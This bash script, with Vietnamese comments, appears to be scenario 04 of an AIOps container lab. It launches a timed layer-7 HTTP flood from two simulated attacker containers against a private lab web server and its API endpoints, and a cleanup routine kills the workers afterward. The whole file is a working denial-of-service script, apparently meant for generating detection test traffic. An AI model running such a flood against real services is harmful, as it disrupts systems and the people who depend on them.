#!/usr/bin/env bash
# =============================================================================
# Kịch bản 04: Quá tải ứng dụng HTTP Flood (Application Layer 7 DoS)
# Mục đích: Bắn dồn dập hàng ngàn HTTP request vào Web Portal và Flask API
# Nguồn: internet-attacker (Internet) & branch-client (Chi nhánh)
# Đích: service-server (192.168.10.10:80) và API backend
# Hiệu ứng: Nginx connections spike, API latency tăng, CPU server tăng cao
# Điểm chặn tự động: Nginx Rate-Limit hoặc Firewall IP Block
# Công cụ: Multi-process curl parallel flood
# =============================================================================
set -euo pipefail

DURATION="${1:-60}"
P="clab-aiops-prod"
CLEANED=0
PID_ATK=""
PID_BR=""

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [START] Kịch bản 04: Server HTTP Flood (Thời lượng: ${DURATION}s)..."

cleanup() {
  [ "$CLEANED" -eq 1 ] && return
  CLEANED=1
  echo
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CLEANUP] Dừng HTTP flood..."
  [ -n "$PID_ATK" ] && kill -9 "$PID_ATK" 2>/dev/null || true
  [ -n "$PID_BR" ] && kill -9 "$PID_BR" 2>/dev/null || true
  for c in "$P-internet-attacker" "$P-branch-client"; do
    docker exec "$c" sh -c '
      if [ -f /tmp/aiops_http_flood.pid ]; then
        kill -9 $(cat /tmp/aiops_http_flood.pid) 2>/dev/null || true
        rm -f /tmp/aiops_http_flood.pid
      fi
      pkill -9 -f "AIOPS_HTTP_FLOOD_WORKER" 2>/dev/null || true
      killall -9 curl 2>/dev/null || true
    ' >/dev/null 2>&1 || true
  done
}
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 143' TERM
trap cleanup EXIT

# Hàm bắn tải liên tục từ container
flood_worker() {
  local container="$1"
  docker exec "$container" sh -c "
    # AIOPS_HTTP_FLOOD_WORKER
    echo \$\$ > /tmp/aiops_http_flood.pid
    STOP_TIME=\$((\$(date +%s) + $DURATION))
    while [ \$(date +%s) -lt \$STOP_TIME ]; do
      for i in \$(seq 1 20); do
        curl -sf -m2 'http://192.168.10.10/' >/dev/null 2>&1 &
        curl -sf -m2 'http://192.168.10.10/api/search?q=Nhan' >/dev/null 2>&1 &
        curl -sf -m2 'http://192.168.10.10/api/employees' >/dev/null 2>&1 &
      done
      wait
    done
    rm -f /tmp/aiops_http_flood.pid
  " &
}

echo "  [+] Bắt đầu bắn HTTP flood đồng thời từ internet-attacker và branch-client..."
flood_worker "$P-internet-attacker"
PID_ATK=$!
flood_worker "$P-branch-client"
PID_BR=$!

ELAPSED=0
while [ "$ELAPSED" -lt "$DURATION" ]; do
  sleep 2
  ELAPSED=$((ELAPSED + 2))
done

kill "$PID_ATK" "$PID_BR" 2>/dev/null || true
wait "$PID_ATK" "$PID_BR" 2>/dev/null || true
cleanup

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [END] Kịch bản 04: Server HTTP Flood hoàn thành."
